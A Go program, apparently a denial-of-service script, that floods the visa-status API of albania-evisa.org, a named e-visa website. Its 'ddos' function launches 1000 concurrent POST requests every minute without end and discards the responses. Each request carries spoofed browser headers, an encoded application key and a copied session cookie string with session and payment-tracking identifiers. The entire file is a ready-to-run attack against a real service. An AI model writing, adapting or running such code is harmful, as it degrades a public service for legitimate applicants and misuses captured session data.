package main

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"sync/atomic"
	"time"

	"github.com/klauspost/compress/zstd"
)

type DdosResp struct {
	AppC string `json:"app_c"`
}

func apiCall() error {
	apiURL := "https://albania-evisa.org/api/"

	// Prepare form data
	formData := url.Values{}
	formData.Set("data[key]", "QUwxOTAzNTg1V1VLIyMjNTE2MDcwMEIwMDJQQjY=")
	formData.Set("data[is_login]", "0")
	formData.Set("data[platform]", "albania-evisa.com")
	formData.Set("act", "visa_status")

	// Create POST request
	req, err := http.NewRequest("POST", apiURL, bytes.NewBufferString(formData.Encode()))
	if err != nil {
		log.Printf("failed to create request: %v\n", err)
		return err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("Accept", "application/json, text/javascript, */*; q=0.01")
	req.Header.Set("accept-encoding", "gzip, deflate, br, zstd")
	req.Header.Set("accept-language", "en-US,en;q=0.9,ru;q=0.8,hy;q=0.7")
	req.Header.Set("cache-control", "no-cache")
	req.Header.Set("content-length", "130")
	req.Header.Set("Cookie", "_ga=GA1.1.1549495911.1775326808; intercom-id-u5pr5cbo=9c1d5520-5cbe-407d-af0d-023accd1d087; intercom-device-id-u5pr5cbo=afa07ce1-677e-4d3a-97ee-cd11b0c0f25e; __stripe_mid=b5f978a4-3b7c-4ce7-8007-2465cef0814d20c9c5; PHPSESSID=ff293e4e9d50cf0a62222dd8429c7d1e; _ga_LLKCMGNBS8=GS2.1.s1779900503$o21$g1$t1779903690$j60$l0$h0; _ga_E8LKXSD1XP=GS2.1.s1779900503$o21$g1$t1779903690$j60$l0$h0; _ga_2YVDSRW4XB=GS2.1.s1779900499$o20$g1$t1779903690$j60$l0$h0; _ga_QX31K5J946=GS2.1.s1779900499$o20$g1$t1779903690$j60$l0$h0; _ga_59NVE7HHGS=GS2.1.s1779900499$o20$g1$t1779903690$j60$l0$h0; _ga_SC04CEFFK3=GS2.1.s1779900499$o20$g1$t1779903690$j60$l0$h0; _ga_VQ1YT6P1K6=GS2.1.s1779900499$o20$g1$t1779903690$j60$l0$h0")

	req.Header.Set("origin", "https://albania-evisa.org")
	req.Header.Set("pragma", "pragma")
	req.Header.Set("priority", "u=1, i")
	req.Header.Set("referer", "https://albania-evisa.org/application-status/")
	req.Header.Set("sec-ch-ua", `"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"macOS"`)
	req.Header.Set("sec-fetch-dest", `empty`)
	req.Header.Set("sec-fetch-mode", `cors`)
	req.Header.Set("sec-fetch-site", `same-origin`)
	req.Header.Set("user-agent", `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36`)
	req.Header.Set("x-requested-with", `XMLHttpRequest`)

	// Execute request
	client := &http.Client{}
	response, err := client.Do(req)
	if err != nil {
		log.Printf("failed to send request: %v\n", err)
		return err
	}
	defer response.Body.Close()

	_, err = decompressResponse(response)
	if err != nil {
		fmt.Println("Error_ReadAll:", err)
		return err
	}

	// log.Println("RESPONSE:", string(body))
	return nil
}

func decompressResponse(resp *http.Response) ([]byte, error) {
	// Create a new decoder
	decoder, err := zstd.NewReader(resp.Body)
	if err != nil {
		return nil, err
	}
	defer decoder.Close() // Always close the decoder to release resources

	// Read the decompressed data
	return io.ReadAll(decoder)
}

func ddos(workersCount int) {
	atomCount := atomic.Uint32{}
	atomCount.Store(0)

	t := time.NewTicker(1 * time.Minute)
	for {
		for range workersCount {
			atomCount.Add(1)
			go apiCall()
		}
		log.Println("api called ", atomCount.Load(), " times.")
		<-t.C
	}
}

func main() {
	ddos(1000)
}
